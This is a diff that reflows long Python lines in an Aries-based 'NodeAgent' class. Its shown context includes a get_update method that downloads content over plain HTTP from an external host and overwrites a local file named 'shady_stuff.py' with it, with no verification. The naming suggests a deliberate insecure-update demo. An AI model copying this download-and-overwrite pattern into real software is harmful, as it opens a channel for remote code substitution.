@@ -24,9 +24,7 @@ class NodeAgent(AriesAgent):
     """
 
     def __init__(self, ident: str, http_port: int, admin_port: int, **kwargs):
-        super().__init__(
-            ident=ident, http_port=http_port, admin_port=admin_port, **kwargs
-        )
+        super().__init__(ident=ident, http_port=http_port, admin_port=admin_port, **kwargs)
         self.connection_id = None
         self._connection_ready = None
         self.cred_state = {}
@@ -54,9 +52,7 @@ class NodeAgent(AriesAgent):
     # Additional methods
     # =============================================================================================
     async def get_update(self, vulnerabilities):
-        async with self.client_session.get(
-            f"http://{DEFAULT_EXTERNAL_HOST}:8080/"
-        ) as resp:
+        async with self.client_session.get(f"http://{DEFAULT_EXTERNAL_HOST}:8080/") as resp:
             # we are overwriting the existing file as update
             with open("shady_stuff.py", "wb") as fd:
                 while True:
@@ -80,8 +76,7 @@ async def register_subnode(agent_container: AgentContainer, node_name: str):
         target_wallet_name=f"{agent_container.ident}.sub.{node_name}",
         public_did=agent_container.public_did
         and (
-            (not agent_container.endorser_role)
-            or (not agent_container.endorser_role == "author")
+            (not agent_container.endorser_role) or (not agent_container.endorser_role == "author")
         ),
         webhook_port=None,
         mediator_agent=agent_container.mediator_agent,
